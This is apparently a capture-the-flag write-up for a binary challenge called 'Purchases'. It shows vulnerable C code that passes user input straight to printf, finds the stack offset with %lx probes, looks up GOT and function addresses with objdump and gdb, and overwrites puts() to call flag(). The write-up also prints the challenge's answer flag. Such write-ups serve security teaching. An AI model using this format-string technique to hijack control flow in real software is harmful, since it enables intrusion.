# Purchases
Binary

## Challenge 

This grumpy shop owner won't sell me his flag! At least I have his source.

/problems/2019/purchases/

nc shell.actf.co 19011

Author: defund

[purchases](purchases)

[purchases.c](purchases.c)

## Solution

#### printf format string attack

See from code

	} else {
		printf("You don't have any money to buy ");
		printf(item);
		printf("s. You're wasting your time! We don't even sell ");
		printf(item);
		printf("s. Leave this place and buy ");
		printf(item);
		printf(" somewhere else. ");
	}

In hopper decompiled code, it appears that the final text has been optimised to a puts("Get out!");

	int main() {
		...
	    } else {
	            printf("You don't have any money to buy ");
	            printf(&var_50);
	            printf("s. You're wasting your time! We don't even sell ");
	            printf(&var_50);
	            printf("s. Leave this place and buy ");
	            printf(&var_50);
	            printf(" somewhere else. ");
	    }
	    puts("Get out!");
	}

---

Fuzz for the offset

	ABCDabcd %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx 

	# ./purchases 
	What item would you like to purchase? ABCDabcd %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx %16lx 
	You don't have any money to buy ABCDabcd     7ffc6e641470     7faa92d3f8c0                0     7faa92d44500     7faa92d44500               c2         6e643b46 6463626144434241

And we get offset of 8

	# ./purchases 
	What item would you like to purchase? ABCDabcd %8$16lx
	You don't have any money to buy ABCDabcd 6463626144434241s.

Next, we will replace replace puts() with flag().

*Alternatively, replace printf() with flag, which will also work .Because I was having trouble replacing printf(), I decided to replace puts() with flag(). However, afterward, I found out it was no longer the case*

Get address.

	printf() : 0x404040
	puts() : 0x404018
	flag() : 0x4011b6

	# objdump -R ./purchases  | grep puts
	0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5

	(gdb) info add flag
	Symbol "flag" is at 0x4011b6 in a file compiled without debugging.

Put to server

	# python format_string_purchases.py | ./purchases 
	What item would you like to purchase? You don't have any money to buy     

	0x404018      @@ somewhere else. actf{limited_edition_flag}

## Flag

	actf{limited_edition_flag}
